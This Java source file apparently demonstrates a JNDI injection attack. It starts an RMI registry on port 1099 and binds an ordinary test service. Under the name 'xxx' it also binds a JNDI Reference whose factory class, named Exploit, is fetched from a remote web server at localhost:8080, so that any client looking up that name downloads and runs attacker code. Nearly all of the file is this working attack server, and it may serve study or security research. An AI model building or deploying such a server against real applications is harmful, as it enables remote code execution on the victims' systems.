package com.dmc.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Scanner;
import javax.naming.Reference;

/**
 * @Author:dingmc
 * @Description:
 * @Date: Created in 12:06 PM 2019/9/1
 * @Modified By:
 */
public class RMIStarter {

    public static void main(String[] args) throws Exception{
        ITestService testService = new TestServiceImpl();
        String remote_class_server = "http://localhost:8080/Exploit.class";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("com.dmc.rmi.Exploit", "com.dmc.rmi.Exploit", remote_class_server);
        //reference的factory class参数指向了一个外部Web服务的地址
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("xxx", referenceWrapper);
        TestServiceImpl service = new TestServiceImpl();
        registry.bind("test", service);

        System.out.println("bind rmi success");
        Scanner in = new Scanner(System.in);
        while (in.hasNextLine()) {
            String str = in.nextLine();
            if ("stop".equals(str)) {
                System.exit(1);
            }
        }
    }
}
